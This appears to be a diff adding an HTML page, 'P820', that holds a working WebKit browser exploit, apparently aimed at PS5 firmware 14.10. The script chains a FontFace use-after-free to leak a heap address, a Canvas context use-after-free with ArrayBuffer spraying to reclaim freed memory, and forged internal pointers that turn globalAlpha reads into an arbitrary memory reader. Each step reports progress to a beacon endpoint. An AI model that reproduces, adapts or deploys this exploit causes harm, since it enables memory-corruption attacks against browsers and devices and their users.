@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P820</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:13px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;}
+.ok{color:#3fb950;} .fail{color:#f85149;} .info{color:#58a6ff;} .hot{color:#ffa657;font-weight:bold;}
+</style>
+</head><body>
+<pre id="o">P820: save() oracle + DataView forge + double heap scanner</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
+function syncBn(t,d){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon.php?tag=P820-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){}
+}
+
+/* ========== Phase 1: FontFace UAF -> H ========== */
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+var face=new FontFace('f1',"local('Helvetica')",{unicodeRange:'U+0041'});
+document.fonts.add(face);
+void face.loaded;
+
+var fabs=[],ffired=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(ffired)return undefined;
+    ffired=true;
+    if(st){st.remove();st.textContent='';st=null;}
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    fabs=[];
+    for(var i=0;i<64;i++)fabs.push(new ArrayBuffer(192));
+    try{document.fonts.check('1em bb1');}catch(e){}
+    document.body.offsetHeight;
+    return undefined;
+  },set:function(){}
+});
+document.fonts.load('1em f1, bb1','AB');
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+
+  /* Find fontAB with residual data */
+  var bestI=-1,bestNz=0;
+  for(var i=0;i<fabs.length;i++){
+    var u=new Uint8Array(fabs[i]),nz=0;
+    for(var j=0;j<u.length;j++)if(u[j]!==0)nz++;
+    if(nz>bestNz){bestNz=nz;bestI=i;}
+  }
+  if(bestI<0||bestNz<4){
+    syncBn('FONT-MISS','nz='+bestNz);
+    setTimeout(function(){location.reload();},300);
+    return;
+  }
+
+  var fontAB=fabs[bestI];
+  var fontDV=new DataView(fontAB);
+  var q11lo=fontDV.getUint32(0x58,true);
+  var q11hi=fontDV.getUint32(0x5C,true);
+  if(q11hi===0){
+    syncBn('FONT-BAD','q11hi=0');
+    setTimeout(function(){location.reload();},300);
+    return;
+  }
+  var borrow=(q11lo<0x68)?1:0;
+  var H_hi=q11hi-borrow, H_lo=(q11lo-0x68)>>>0;
+  var Hstr='0x'+H_hi.toString(16)+('00000000'+H_lo.toString(16)).slice(-8);
+
+  syncBn('FONT-OK','H='+Hstr);
+  log('H = '+Hstr,'ok');
+
+  /* Prepare H as a safe State (all zeros except a marker at globalAlpha) */
+  var fontU8=new Uint8Array(fontAB);
+  for(var i=0;i<192;i++)fontU8[i]=0;
+  /* State+0: globalAlpha = 3.14159265 (marker to confirm reads work) */
+  fontDV.setFloat64(0, 3.14159265, true);
+
+  /* ========== Phase 2: Canvas UAF ========== */
+  var innerCtx=null;
+  var canvas=document.createElement('canvas');
+  canvas.width=1;canvas.height=1;
+  var opts={};
+  Object.defineProperty(opts,'alpha',{
+    get:function(){
+      innerCtx=canvas.getContext('2d');
+      return true;
+    }
+  });
+  canvas.getContext('bitmaprenderer',opts);
+
+  if(!innerCtx){
+    syncBn('UAF-FAIL','');
+    setTimeout(function(){location.reload();},300);
+    return;
+  }
+  syncBn('UAF-OK','');
+
+  /* ========== Phase 3: AB(768) spray — all zeros ========== */
+  var SPRAY=500;
+  var abs768=[];
+  var u32Views=[];
+  for(var s=0;s<SPRAY;s++){
+    var ab=new ArrayBuffer(768);
+    abs768.push(ab);
+    u32Views.push(new Uint32Array(ab));
+  }
+  syncBn('SPRAY','n='+SPRAY);
+
+  /* ========== Phase 4: save() — non-crashing write to reclaim AB ========== */
+  /* save() only increments m_unrealizedSaveCount (at context+592 = AB byte 592)
+   * This does NOT access m_canvas, m_stateStack, or any virtual methods.
+   * If AB reclaimed the context slot, dword at byte 592 (index 148) becomes 1. */
+  var saveOk=false;
+  try{
+    innerCtx.save();
+    saveOk=true;
+  }catch(e){}
+
+  if(!saveOk){
+    syncBn('SAVE-FAIL','');
+    setTimeout(function(){location.reload();},300);
+    return;
+  }
+
+  /* ========== Phase 5: Scan all ABs for mutations ========== */
+  /* Primary target: dword index 148 (byte 592 = m_unrealizedSaveCount)
+   * Also scan ALL dwords in case the offset is different on PS5 14.10 */
+  var reclaimIdx=-1, reclaimOff=-1;
+  var allHits=[];
+
+  for(var b=0;b<SPRAY;b++){
+    var v=u32Views[b];
+    for(var w=0;w<v.length;w++){
+      if(v[w]!==0){
+        allHits.push({buf:b, dword:w, byte:w*4, val:v[w]});
+        if(v[w]===1 && reclaimIdx<0){
+          reclaimIdx=b;
+          reclaimOff=w*4;
+        }
+      }
+    }
+  }
+
+  syncBn('SCAN','hits='+allHits.length+'|reclaim='+(reclaimIdx>=0?'YES':'NO'));
+  log('Scan: '+allHits.length+' mutations, reclaim='+(reclaimIdx>=0?'AB['+reclaimIdx+']+'+reclaimOff:'NONE'),'info');
+
+  /* Report all hits (up to 10) */
+  for(var h=0;h<allHits.length&&h<10;h++){
+    syncBn('HIT','buf='+allHits[h].buf+'|byte='+allHits[h].byte+'|val=0x'+allHits[h].val.toString(16));
+    log('  AB['+allHits[h].buf+'] +'+allHits[h].byte+' = 0x'+allHits[h].val.toString(16),'ok');
+  }
+
+  if(reclaimIdx<0){
+    /* No reclaim detected — AB(768) doesn't reclaim Canvas2D on this firmware */
+    syncBn('VERDICT','NO_RECLAIM|hits='+allHits.length);
+    log('VERDICT: AB(768) does NOT reclaim Canvas2D context','fail');
+    log('IsoHeap likely active for CanvasRenderingContext2D on 14.10','fail');
+
+    /* Try second save() to see if increment is detectable on a wider scan */
+    try{ innerCtx.save(); }catch(e){}
+    var hits2=0;
+    for(var b=0;b<SPRAY;b++){
+      var v=u32Views[b];
+      for(var w=0;w<v.length;w++){
+        if(v[w]!==0) hits2++;
+      }
+    }
+    syncBn('SAVE2-SCAN','hits2='+hits2);
+    syncBn('DONE','no_reclaim');
+    return;
+  }
+
+  /* ========== Phase 6: AB RECLAIM CONFIRMED — forge context + heap scan ========== */
+  log('','');
+  log('*** AB(768) RECLAIM CONFIRMED at AB['+reclaimIdx+'] ***','hot');
+  log('m_unrealizedSaveCount at byte offset '+reclaimOff,'ok');
+
+  /* The context base is at AB byte 0 (AB backing store = context memory).
+   * m_unrealizedSaveCount is at context+592 if reclaimOff=592, or wherever it landed.
+   * We'll use reclaimOff to validate: context+reclaimOff = m_unrealizedSaveCount. */
+
+  var abDV=new DataView(abs768[reclaimIdx]);
+
+  /* CRITICAL: Forge m_stateStack to point to H (fontAB)
+   * m_stateStack.m_buffer at context+112 = AB byte 112
+   * m_stateStack.m_capacity at context+120 = AB byte 120
+   * m_stateStack.m_size at context+124 = AB byte 124 */
+  abDV.setUint32(112, H_lo, true);
+  abDV.setUint32(116, H_hi, true);
+  abDV.setUint32(120, 1, true);
+  abDV.setUint32(124, 1, true);
+
+  /* Forge m_canvas at context+32 to H (GC risk but needed for survival).
+   * H points to our fontAB: H+0 has float64 3.14159 (from our marker write).
+   * The GC visitor reads the vtable at H+0 — it will find 3.14159's bytes
+   * which is 0x400921FB54442D18. If GC runs, it will try to use this as
+   * a vtable → crash. But if we're fast enough, we get reads in first. */
+  abDV.setUint32(32, H_lo, true);
+  abDV.setUint32(36, H_hi, true);
+
+  syncBn('FORGE','mstk=H|mcanvas=H');
+
+  /* ========== Phase 7: FAST double reads — heap scanner ========== */
+  /* globalAlpha returns a float64 (JSC immediate value, NO JS heap allocation).
+   * Each read: change m_stateStack.m_buffer → target addr, read globalAlpha.
+   * globalAlpha is at State+0, so reads target+0 as float64. */
+
+  var results=[];
+  var SCAN_RANGE=16; /* scan H-N*192 to H+N*192 in 192-byte steps */
+
+  /* First: read from H+0 (should return 3.14159265 = our marker) */
+  var ga;
+  try{
+    ga=innerCtx.globalAlpha;
+    results.push({off:0, val:ga});
+  }catch(e){
+    syncBn('READ-CRASH','first_read_failed:'+e.message);
+    return;
+  }
+
+  /* If marker matches, our forge works! */
+  var markerOk=Math.abs(ga-3.14159265)<0.0001;
+  syncBn('MARKER','val='+ga+'|match='+markerOk);
+  log('globalAlpha from H+0 = '+ga+' (expect 3.14159265, match='+markerOk+')','ok');
+
+  if(!markerOk){
+    /* Read didn't return our marker — forge failed or wrong offset */
+    syncBn('FORGE-FAIL','ga='+ga);
+    syncBn('DONE','forge_mismatch');
+    return;
+  }
+
+  /* Marker confirmed! Now scan heap around H.
+   * For each offset: set m_buffer = H + delta, read globalAlpha.
+   * WARNING: if H+delta is unmapped, the read crashes the page.
+   * So we scan in 192-byte steps (FontFace AB allocation granularity).
+   * Pages near H are likely mapped (same heap region). */
+
+  log('Scanning heap around H (192B steps)...','info');
+
+  /* Clear our marker from H so adjacent reads are uncontaminated */
+  fontDV.setFloat64(0, 0, true);
+
+  /* Scan FORWARD from H: H+192, H+384, ... */
+  for(var d=1;d<=SCAN_RANGE;d++){
+    /* target = H + d*192 */
+    var tlo=(H_lo + d*192)>>>0;
+    var thi=H_hi;
+    if(tlo < H_lo) thi++; /* carry */
+
+    abDV.setUint32(112, tlo, true);
+    abDV.setUint32(116, thi, true);
+
+    try{
+      ga=innerCtx.globalAlpha;
+      results.push({off:d*192, val:ga});
+    }catch(e){
+      results.push({off:d*192, val:'CRASH'});
+      break; /* stop scanning forward on crash */
+    }
+  }
+
+  /* Restore m_buffer to H for safety */
+  abDV.setUint32(112, H_lo, true);
+  abDV.setUint32(116, H_hi, true);
+
+  /* Scan BACKWARD from H: H-192, H-384, ... */
+  for(var d=1;d<=SCAN_RANGE;d++){
+    /* target = H - d*192 */
+    var tlo=(H_lo - d*192)>>>0;
+    var thi=H_hi;
+    if(tlo > H_lo) thi--; /* borrow */
+
+    abDV.setUint32(112, tlo, true);
+    abDV.setUint32(116, thi, true);
+
+    try{
+      ga=innerCtx.globalAlpha;
+      results.push({off:-d*192, val:ga});
+    }catch(e){
+      results.push({off:-d*192, val:'CRASH'});
+      break; /* stop scanning backward on crash */
+    }
+  }
+
+  /* ========== Phase 8: Report results ========== */
+  /* Beacon each result. String concat allocates → GC risk. Be concise. */
+  var rStr='';
+  for(var r=0;r<results.length;r++){
+    var v=results[r].val;
+    var vs=(v==='CRASH')?'X':(v===0?'0':v.toExponential(6));
+    rStr+=results[r].off+':'+vs+'|';
+    if(rStr.length>800){
+      syncBn('HEAP',rStr);
+      rStr='';
+    }
+  }
+  if(rStr.length>0) syncBn('HEAP',rStr);
+
+  /* Summary */
+  var mapped=0, nonzero=0;
+  for(var r=0;r<results.length;r++){
+    if(results[r].val!=='CRASH'){
+      mapped++;
+      if(results[r].val!==0) nonzero++;
+    }
+  }
+  syncBn('SUMMARY','mapped='+mapped+'/'+results.length+'|nonzero='+nonzero);
+  log('Heap scan: '+mapped+' mapped, '+nonzero+' nonzero out of '+results.length+' probed','ok');
+
+  /* Display results */
+  for(var r=0;r<results.length;r++){
+    var v=results[r].val;
+    var cls=(v==='CRASH')?'fail':(v===0?'info':'hot');
+    var vs=(v==='CRASH')?'UNMAPPED':(v===0?'0.0':v.toExponential(10));
+    log('  H'+(results[r].off>=0?'+':'')+results[r].off+': '+vs, cls);
+  }
+
+  syncBn('DONE','reclaim_confirmed|scan_complete');
+  log('','');
+  log('P820 COMPLETE','hot');
+
+  /* Cleanup: zero out the reclaim AB to prevent GC crash on idle */
+  var cleanU8=new Uint8Array(abs768[reclaimIdx]);
+  for(var c=0;c<768;c++) cleanU8[c]=0;
+
+},600);
+</script></body></html>
